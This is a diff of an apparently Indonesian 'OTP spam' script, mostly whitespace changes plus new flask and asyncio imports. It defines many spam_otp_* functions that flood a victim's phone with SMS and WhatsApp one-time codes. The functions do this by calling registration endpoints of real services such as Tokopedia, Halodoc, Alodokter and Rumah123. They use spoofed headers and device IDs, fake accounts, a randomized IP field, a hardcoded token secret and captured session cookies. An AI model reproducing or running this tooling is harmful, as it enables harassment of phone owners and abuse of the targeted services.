@@ -17,12 +17,14 @@ import base64
 import uuid
 import phonenumbers
 import smtplib
+import asyncio
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from datetime import datetime
 from urllib.parse import quote
 from concurrent.futures import ThreadPoolExecutor
 
+from flask import Flask, request
 
 try:
     from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -190,15 +192,15 @@ def spam_otp_sidemang(nomor):
             nomor = '0' + nomor[3:]
         else:
             nomor = '0' + nomor
-        
+
         import random
         import string
-        
+
         nama = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
         email = f"{nama}{random.randint(100, 999)}@gmail.com"
-        
+
         url = 'https://sidemang.palembang.go.id/api/users/register/send-otp'
-        
+
         headers = {
             'Content-Type': 'application/json',
             'origin': 'https://sidemang.palembang.go.id',
@@ -211,15 +213,15 @@ def spam_otp_sidemang(nomor):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
         }
-        
+
         payload = {
             "phoneNumber": nomor,
             "email": email
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -247,7 +249,7 @@ def spam_otp_adiraku(nomor):
 
      except Exception as e:
         return False
-    
+
 def spam_otp_tokopedia(nomor):
       try:
         session = requests.Session()
@@ -274,7 +276,7 @@ def spam_otp_tokopedia(nomor):
         return resp2.status_code == 200
       except:
         return False
-    
+
 def spam_otp_singa(nomor):
     try:
         url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
@@ -283,7 +285,7 @@ def spam_otp_singa(nomor):
         res = requests.post(url, json=payload, headers=headers, timeout=10)
     except:
         return False
-        
+
 def spam_otp_singa_kedua(nomor):
     try:
         url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
@@ -309,11 +311,11 @@ def spam_otp_singa_wa(nomor):
         return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
     except:
         return False
-    
+
 def spam_otp_pinhome(nomor):
     try:
         import re
-        
+
         if nomor.startswith('0'):
             nomor_lokal = nomor
         elif nomor.startswith('62'):
@@ -322,19 +324,19 @@ def spam_otp_pinhome(nomor):
             nomor_lokal = '0' + nomor[3:]
         else:
             nomor_lokal = '0' + nomor
-        
+
         session = requests.Session()
-        
+
         r0 = session.get('https://www.pinhome.id/daftar',
             headers={
                 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
             },
             timeout=10
         )
-        
+
         if r0.status_code != 200:
             return False
-        
+
         csrf_match = re.search(r'name="csrf-token" content="([^"]+)"', r0.text)
         if csrf_match:
             csrf_token = csrf_match.group(1)
@@ -342,9 +344,9 @@ def spam_otp_pinhome(nomor):
             csrf_token = session.cookies.get('_X7kCsrf')
             if not csrf_token:
                 return False
-        
+
         url = 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp'
-        
+
         headers = {
             'Content-Type': 'text/plain;charset=UTF-8',
             'x-csrf-token': csrf_token,
@@ -353,7 +355,7 @@ def spam_otp_pinhome(nomor):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
             'accept': '*/*'
         }
-        
+
         payload = {
             "accountType": "customers",
             "applicationType": "Pinhome Web",
@@ -362,13 +364,13 @@ def spam_otp_pinhome(nomor):
             "otpType": "register",
             "phoneNumber": nomor_lokal
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
-    
+
 def spam_otp_duniagames(nomor):
     try:
         if nomor.startswith('0'):
@@ -379,11 +381,11 @@ def spam_otp_duniagames(nomor):
             nomor = nomor
         else:
             nomor = '+62' + nomor
-        
+
         device = str(uuid.uuid4())
-        
+
         url = 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-encoding': 'gzip, deflate, br, zstd',
@@ -403,14 +405,14 @@ def spam_otp_duniagames(nomor):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
             'x-device': device
         }
-        
+
         payload = {
             "phoneNumber": nomor,
             "userName": nomor[1:]
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        
+
         if resp.status_code == 200:
             try:
                 data = resp.json()
@@ -420,11 +422,11 @@ def spam_otp_duniagames(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
-           
-    
+
+
 def spam_otp_acc(nomor):
     try:
         if nomor.startswith('0'):
@@ -435,18 +437,18 @@ def spam_otp_acc(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         next_action = "7f8e862fff4b3a97ae5e866780a086283a999e8a7f"
         next_router = "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
-        
+
         curl_cmd = f"""curl -s -X POST 'https://www.acc.co.id/register/new-account' \\
   -H 'Host: www.acc.co.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -466,9 +468,9 @@ def spam_otp_acc(nomor):
   -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'Cookie: _gcl_gs=2.1.k1$i1783212550$u132089247; _gcl_aw=GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB; _ga=GA1.1.2146116177.1783212563; _fbp=fb.2.1783212567536.574928455222574690; acw_tc=0a0a131517868956750878858e541f01b7d928d2a585326a758c753a2cc50e; deviceId=Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; _ga_HSTJBSDEEW=GS2.1.s1786895689$o3$g0$t1786895689$j60$l0$h0; _uetsid=d03ca050998a11f18069e52179483202; _uetvid=5d56eab0780b11f1b98421a5d543c1a8; mp_e88342495971d35d9d9164ffba696eec_mixpanel=%7B%22distinct_id%22%3A%22%24device%3Acf86d193-c59e-4187-be14-77874755733f%22%2C%22%24device_id%22%3A%22cf86d193-c59e-4187-be14-77874755733f%22%2C%22%24search_engine%22%3A%22google%22%2C%22utm_source%22%3A%22LAL%20Prospek%20IN%20Valid%20MGU%20Mar-Apr%22%2C%22utm_medium%22%3A%22Pmax%201%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%2C%22__mps%22%3A%7B%7D%2C%22__mpso%22%3A%7B%22initial_utm_source%22%3A%22LAL%20Prospek%20IN%20Valid%20MGU%20Mar-Apr%22%2C%22initial_utm_medium%22%3A%22Pmax%201%22%2C%22initial_utm_campaign%22%3Anull%2C%22initial_utm_content%22%3Anull%2C%22initial_utm_term%22%3Anull%2C%22initial_utm_id%22%3Anull%2C%22initial_utm_source_platform%22%3Anull%2C%22initial_utm_campaign_id%22%3Anull%2C%22initial_utm_creative_format%22%3Anull%2C%22initial_utm_marketing_tactic%22%3Anull%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%7D%2C%22__mpus%22%3A%7B%7D%2C%22__mpa%22%3A%7B%7D%2C%22__mpu%22%3A%7B%7D%2C%22__mpr%22%3A%5B%5D%2C%22__mpap%22%3A%5B%5D%7D; _gcl_au=1.1.612971413.1783212562.2099357529.1786895693.1786895726.1390151220.1786895693.1786895726' \\
   --data-raw '[{{"user_id":null,"action":"register","send_to":"{phone}","provider":"whatsapp"}}]'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -481,10 +483,10 @@ def spam_otp_acc(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_acc_kedua(nomor):
     try:
         if nomor.startswith('0'):
@@ -495,14 +497,14 @@ def spam_otp_acc_kedua(nomor):
             nomor = '0' + nomor[3:]
         else:
             nomor = '0' + nomor
-        
+
         nomor = ''.join(filter(str.isdigit, nomor))
-        
+
         if len(nomor) < 10:
             return False
-        
+
         session = requests.Session()
-        
+
         cookies = {
             '_gcl_gs': '2.1.k1$i1783212550$u132089247',
             '_gcl_aw': 'GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB',
@@ -515,9 +517,9 @@ def spam_otp_acc_kedua(nomor):
             '_uetvid': '5d56eab0780b11f1b98421a5d543c1a8',
             '_gcl_au': '1.1.612971413.1783212562.2026417872.1783529859.1783529963'
         }
-        
+
         session.cookies.update(cookies)
-        
+
         headers_base = {
             'Accept': 'text/x-component',
             'Accept-Encoding': 'gzip, deflate, br, zstd',
@@ -533,11 +535,11 @@ def spam_otp_acc_kedua(nomor):
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Site': 'same-origin'
         }
-        
+
         headers = headers_base.copy()
         headers['next-action'] = '7fd7799322a505bdfacd0dcd6cac5aa319e2350972'
         headers['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
-        
+
         payload = [
             {
                 "user_id": None,
@@ -546,13 +548,13 @@ def spam_otp_acc_kedua(nomor):
                 "provider": "whatsapp"
             }
         ]
-        
+
         resp = session.post('https://www.acc.co.id/register/new-account',
             headers=headers,
             json=payload,
             timeout=10
         )
-        
+
         if resp.status_code == 200:
             try:
                 data = resp.json()
@@ -570,10 +572,10 @@ def spam_otp_acc_kedua(nomor):
                 return True if resp.status_code == 200 else False
         else:
             return False
-        
+
     except Exception as e:
         return False
-   
+
 def spam_otp_absenku(nomor):
       try:
         if nomor.startswith("62"):
@@ -631,7 +633,7 @@ def spam_otp_absenku(nomor):
         return resp.status_code < 400
       except:
         return False
-    
+
 def spam_otp_saturdays(nomor):
      try:
         if nomor.startswith("0"):
@@ -640,10 +642,10 @@ def spam_otp_saturdays(nomor):
             nomor_lokal = nomor[2:]
         else:
             nomor_lokal = nomor
-        
+
         session = requests.Session()
         url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
-        
+
         headers = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
             'Accept-Encoding': "gzip, deflate, br",
@@ -665,18 +667,18 @@ def spam_otp_saturdays(nomor):
             'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
             'priority': "u=1, i"
         }
-        
+
         payload = {
             "number": nomor_lokal,
             "country_code": "+62",
             "type": "WHATSAPP"
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-    
+
 def spam_otp_maulagi(nomor):
     try:
         if nomor.startswith('0'):
@@ -685,14 +687,14 @@ def spam_otp_maulagi(nomor):
             nomor = '0' + nomor[2:]
         elif nomor.startswith('+62'):
             nomor = '0' + nomor[3:]
-        
+
         nomor = ''.join(filter(str.isdigit, nomor))
-        
+
         if len(nomor) < 10:
             return False
-        
+
         url = 'https://api.maulagi.id/api/v2/auth/check'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'content-type': 'application/json',
@@ -706,13 +708,13 @@ def spam_otp_maulagi(nomor):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
         }
-        
+
         payload = {"credentials": nomor}
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        
+
         return resp.status_code == 200
-        
+
     except Exception as e:
         return False
 
@@ -736,7 +738,7 @@ def spam_otp_bliblitiket(nomor):
         resp = session.post('https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate', data='{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"' + nomor + '","recaptchaToken":""}', headers=headers, timeout=10)
     except:
         return False
-     
+
 def spam_otp_matahari(nomor):
       try:
         if nomor.startswith("0"):
@@ -745,16 +747,16 @@ def spam_otp_matahari(nomor):
             nomor_lokal = nomor[2:]
         else:
             nomor_lokal = nomor              
-        
+
         import random
         import string
         random_email = f"user{random.randint(100000,999999)}@gmail.com"
         random_name = f"User{random.randint(100,999)}"
         random_password = ''.join(random.choices(string.ascii_letters + string.digits + "._", k=16))
-        
+
         session = requests.Session()
         url = "https://matahari-backend-prod.matahari.com/api/auth/register"
-        
+
         headers = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
             'Accept-Encoding': "gzip, deflate, br",
@@ -769,7 +771,7 @@ def spam_otp_matahari(nomor):
             'Referer': "https://matahari.com/",
             'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
         }
-        
+
         payload = {
             "emailAddress": random_email,
             "name": random_name,
@@ -784,7 +786,7 @@ def spam_otp_matahari(nomor):
             "pickupStoreCode": "",
             "marketingCode": ""
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
       except:
@@ -798,10 +800,10 @@ def spam_otp_rumah123(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "62" + nomor
-        
+
         session = requests.Session()
         url = "https://www.rumah123.com/api/otp/request-otp"
-        
+
         headers = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
             'Accept': "application/json, text/plain, */*",
@@ -820,7 +822,7 @@ def spam_otp_rumah123(nomor):
             'priority': "u=1, i",
             'Cookie': "ajs_anonymous_id=962b0766-64e4-493c-ae48-e59524822742; _ga=GA1.1.533350590.1780038198; _fbp=fb.1.1780038199360.807614422108834462; _tt_enable_cookie=1; _ttp=01KSS8PT9AQ=2N85JA4NBZ289F_.tt.1; __gads=ID=6ca90e1a33b998e9:T=1780045927:RT=1780045927:S=ALNI_Mb48=zdld8fUzNTj2mKtzcuQteMfQ; __gpi=UID=000014381fc3b087:T=1780045927:RT=1780045927:S=ALNI_MbWUjDmbUHcU-lmpT4CdYzH88d6yw; __eoi=ID=c85668bfa6f5416c:T=1780045927:RT=1780045927:S=AA-AfjZDUEoWxpdAvxXN4ehDANSQ; enquiry_data={\"email\":\"Jokowi@gmail.com\",\"isEverTickMortgage\":false,\"isVerified\":false,\"name\":\"Bray\",\"otpExpiredTime\":1780046220580,\"phoneNumber\":\"6285757102633\",\"requestOTPTime\":1780048557646}; 99group=s%3Accfa8db0-50f5-4e86-8aeb-35622f2b2cc0.G%2FYccepBgrnc6CJZvAPejEIwPe0jzpnoIjF3bvdL35s; _cfuvid=JIxmpGlboMHKgIlCU_H9Oc5=kw9ZYv9H8Mgr0B2FOec-1780182128.8329046-1.0.1.1-hIBwtBRvNB1Bv5_PsQGgwwAgoLU8KCBhSa6g9Abs9.Q; _clck=1n8grzt%5E2%5Eg6h%5E0%5E2340; flag_data={\"showAppsDownloadBanner\":true}; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%22e1507b7e-d15b-40ef-b408-d0cc88941c59%5C%22%2C%5B1780038190%2C882000000%5D%5D%22%5D%5D%5D; segment-utm=eyJpdG1fbWkaX=tIjoiIiwiaXRtX3NvdXJjZSI6IiIsInBhZ2=fcm=mZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInNlc3Npb25fY291bnQiOjMsInNlc3Npb25fcm=mZXJyZXIiOjE3ODAxODIxMzE0MTIsInRpbW=zdGFtcCI6MTc4MDE4MjE3MDg0OSwidXRtX2NhbXBhaWduIjoiIiwidXRtX21lZGl1bSI6IiIsIn=0b=9zb3=yY2UiOiIifQzz; FCNEC=%5B%5B%22AKsRol-ufo=7rjU2mcoI=kLK9e4X2SajLpPwjup6Os7MDD0gzmh_Cgps6b5CUxPAUD9eSXrKUE0ClyvIK2CkIZkYxujk5vOnGmDR050J8xB26-Hqp6hvMh1wYxihBBen1G3_ysUKac0FyaTTkRoQ-ZefR2bi6ko8TA%3D%3D%22%5D%5D; _ga_D5=06TRY2RzGS2.1.s1780182173$o4$g0$t1780182173$j60$l0$h0; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22WHnraPibWLKLluimE5Gw%22%2C%22expiryDate%22%3A%222027-05-30T23%3A02%3A54.553Z%22%7D; ttcsid=1780182175610::ron=FY0wjKCEa72LL2gJ.4.1780182182816.0::1.-37243.0::7090.2.285.885::0.0.0; ttcsid_C2OBT2A3E7AM6FQ8BMMG=1780182175601::NBtm-TUK-lurT5Q-Kl19.4.1780182182817.0; _ga_Z36X54E7Z5=GS2.1.s1780182173$o4$g0$t1780182182$j51$l0$h0; _gcl_au=1.1.950890321.1780038193.1925756783.1780182179.1780182183"
         }
-        
+
         payload = {
             "ipAddress": f"140.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
             "phoneNumber": nomor_lokal,
@@ -828,12 +830,12 @@ def spam_otp_rumah123(nomor):
             "type": "WHATSAPP",
             "url": "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/"
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-       
+
 def spam_otp_halodoc(nomor):
      try:
         if nomor.startswith("0"):
@@ -842,10 +844,10 @@ def spam_otp_halodoc(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "62" + nomor
-        
+
         session = requests.Session()
         url = "https://customers.api.halodoc.com/magneto-api/v2/users/authentication/otp/requests"
-        
+
         headers = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
             'Accept': "application/json, text/plain, */*",
@@ -863,19 +865,19 @@ def spam_otp_halodoc(nomor):
             'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
             'Cookie': "rx=isitorrwlrur9lz1780208322401=UP888O9A=FOLNR8R0HR3389UTPU62HD; dtSarwlrur9lz-; _gcl_au=1.1.1758244023.1780208325; _ga=GA1.1.51880007.1780208328; rxvtrwlrur9lz1780210130688|1780208322422; dtPCrwlrur9lz5$8322365_313h32vHSWFLANATLPCNEMPCUQHAFKRGRTPDUTW-0e0; dtCookierwlrur9lzv_4_srv_5_sn_85FE102AE029FEC31922E56941139E18_app-3Ae28137e9070184e7_0_app-3Aea7c4b59f27d43eb_0_ol_0_perc_100000_mul_1_rcs-3Acss_0; afUserId=69040147-6a0d-47d5-8454-8d920230c2f0-p; AF_SYNC=1780208331597; WZRK_Gz=f8f4004de684498e9aea0d16dcfc99d4; WZRK_S_WR9-ZRZ-9W7Z=%7B%22p%22%3A1%2C%22s%22%3A1780208334%2C%22t%22%3A1780208334%7D; _ga_02NBJNEK=HGS2.1.s1780208328$o1$g0$t1780208338$j50$l0$h0; XSRF-TOKEN=E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9"
         }
-        
+
         payload = {
             "phone_number": f"+{nomor_lokal}",
             "channel": "whatsapp",
             "otp_resent": False,
             "clientId": "4dccb45a031542ad01fd22931238c909"
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-        
+
 def spam_otp_misteraladin(nomor):
     try:
         if nomor.startswith('0'):
@@ -889,15 +891,15 @@ def spam_otp_misteraladin(nomor):
 
         import time
         import hashlib
-        
+
         timestamp = str(int(time.time()))
-        
+
         secret = '6c7A1ZUdVtREXQxO5XcW83ESODEoUld7fJGZCvor8awEcm24tr'
         raw = f'{secret}{timestamp}'
         member_token = hashlib.sha256(raw.encode()).hexdigest()
 
         url = 'https://m.misteraladin.com/api/members/v2/otp/request'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'id',
@@ -940,7 +942,7 @@ def spam_otp_misteraladin(nomor):
 
     except Exception as e:
         return False
-       
+
 def spam_otp_paper(nomor):
      try:
         if nomor.startswith("0"):
@@ -951,10 +953,10 @@ def spam_otp_paper(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "62" + nomor
-        
+
         session = requests.Session()
         url = "https://register.paper.id/api/v1/auth/register/send-otp"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://paper.id',
@@ -963,15 +965,15 @@ def spam_otp_paper(nomor):
             'Accept': 'application/json, text/plain, */*',
             'Referer': 'https://paper.id/'
         }
-        
+
         payload = {
             "phone": nomor_lokal,
             "method": "whatsapp",
             "registered_by": "flutter mweb"
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
-        
+
 
         if resp.status_code == 200:
             data = resp.json()
@@ -981,10 +983,10 @@ def spam_otp_paper(nomor):
                 return False
         else:
             return False
-            
+
      except Exception as e:
         return False
-        
+
 def spam_otp_singa_toy(nomor):
     try:
         if nomor.startswith('62'):
@@ -995,39 +997,39 @@ def spam_otp_singa_toy(nomor):
             nomor = nomor
         else:
             nomor = '0' + nomor
-        
+
         models = ['SM-S928B', 'SM-G965N', 'SM-N975F', 'SM-A515F', 'SM-M127F', 'Infinix X6532C', 'Redmi Note 10', 'POCO X3', 'vivo 2007', 'OPPO CPH2083']
         model = random.choice(models)
-        
+
         versions = ['2.4.7', '2.4.8', '2.4.9', '2.5.0', '2.5.1']
         versionName = random.choice(versions)
         versionCode = versionName.replace('.', '')
-        
+
         systemVersions = ['11', '12', '13', '14']
         systemVersion = random.choice(systemVersions)
-        
+
         appsflyer_id = str(int(time.time() * 1000)) + '-' + str(random.randint(1000000000000000000, 9999999999999999999))
-        
+
         session = requests.Session()
-        
+
         headers = {
             'Content-Type': 'application/json; charset=utf-8',
             'User-Agent': f'Mozilla/5.0 (Linux; Android {systemVersion}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'
         }
-        
+
         url = f'https://api102.singa.id/new/login/sendWaOtp?versionName={versionName}&versionCode={versionCode}&model={model}&systemVersion={systemVersion}&platform=android&appsflyer_id={appsflyer_id}'
-        
+
         payload = {
             'mobile_phone': nomor,
             'type': 'mobile',
             'is_switchable': 1
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return spam_otp_nilai(resp.text, '"msg":"', '"') == 'Success'
     except:
         return False
-       
+
 def spam_otp_planetban(nomor):
      try:
 
@@ -1039,15 +1041,15 @@ def spam_otp_planetban(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "0" + nomor
-        
+
         import random
         import string
         random_name = f"User{random.randint(100,999)}"
         random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-        
+
         session = requests.Session()
         url = "https://api.planetban.com/website/customer/request-otp"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://planetban.com',
@@ -1055,7 +1057,7 @@ def spam_otp_planetban(nomor):
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
             'Accept': 'application/json, text/plain, */*'
         }
-        
+
         payload = {
             "name": random_name,
             "phone": nomor_lokal,
@@ -1063,9 +1065,9 @@ def spam_otp_planetban(nomor):
             "purpose": "register",
             "method": "whatsapp"
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
-       
+
         if resp.status_code == 200:
             data = resp.json()
             if data.get("status") == True or data.get("success") == True or "success" in str(data).lower():
@@ -1074,10 +1076,10 @@ def spam_otp_planetban(nomor):
                 return False
         else:
             return False
-            
+
      except Exception as e:
         return False
-      
+
 def spam_otp_bunda(nomor):
      try:
         if nomor.startswith("0"):
@@ -1088,10 +1090,10 @@ def spam_otp_bunda(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "62" + nomor
-        
+
         session = requests.Session()
         url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://www.bunda.co.id',
@@ -1099,17 +1101,17 @@ def spam_otp_bunda(nomor):
             'Referer': 'https://www.bunda.co.id/',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             "phone_number": int(nomor_lokal),
             "type": "auth"
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-       
+
 def spam_otp_bonusbelanja(nomor):
      try:
         if nomor.startswith("0"):
@@ -1120,29 +1122,29 @@ def spam_otp_bonusbelanja(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "62" + nomor
-        
+
         session = requests.Session()
         url = "https://www.bonusbelanja.com/api/auth/registration/app"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://www.bonusbelanja.com',
             'Referer': 'https://www.bonusbelanja.com/register/',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             "phone": nomor_lokal,
             "name": "User",
             "agreeTnc": True,
             "agreeContact": True
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-       
+
 def spam_otp_hijup(nomor):
      try:
         if nomor.startswith("0"):
@@ -1153,10 +1155,10 @@ def spam_otp_hijup(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "62" + nomor
-        
+
         session = requests.Session()
         url = "https://www.hijup.com/sign_in"
-        
+
         headers = {
             'Content-Type': 'text/plain;charset=UTF-8',
             'Origin': 'https://www.hijup.com',
@@ -1166,14 +1168,14 @@ def spam_otp_hijup(nomor):
             'Referer': 'https://www.hijup.com/sign_in',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = f'[{{"phone_number":"{nomor_lokal}","store_path":"hijup"}}]'
-        
+
         resp = session.post(url, data=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-    
+
 def spam_otp_alodokter_sms(nomor):
     try:
         if nomor.startswith('0'):
@@ -1182,14 +1184,14 @@ def spam_otp_alodokter_sms(nomor):
             nomor_lokal = '0' + nomor[2:]
         else:
             nomor_lokal = '0' + nomor
-        
+
         raw = nomor_lokal[1:] if nomor_lokal.startswith('0') else nomor_lokal
-        
+
         uuid_val = str(uuid.uuid4())
-        
+
         session = requests.Session()
         url = "https://www.alodokter.com/resend-otp"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://www.alodokter.com',
@@ -1206,7 +1208,7 @@ def spam_otp_alodokter_sms(nomor):
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin'
         }
-        
+
         payload = {
             "user": {
                 "phone": nomor_lokal,
@@ -1214,7 +1216,7 @@ def spam_otp_alodokter_sms(nomor):
             },
             "request_via": "sms"
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
     except:
@@ -1228,15 +1230,15 @@ def spam_otp_alodokter(nomor):
             nomor_lokal = "0" + nomor[2:]
         else:
             nomor_lokal = "0" + nomor
-        
+
         raw = nomor_lokal[1:] if nomor_lokal.startswith("0") else nomor_lokal
-        
+
         import uuid
         uuid_val = str(uuid.uuid4())
-        
+
         session = requests.Session()
         url = "https://www.alodokter.com/resend-otp"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://www.alodokter.com',
@@ -1244,7 +1246,7 @@ def spam_otp_alodokter(nomor):
             'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             "user": {
                 "phone": nomor_lokal,
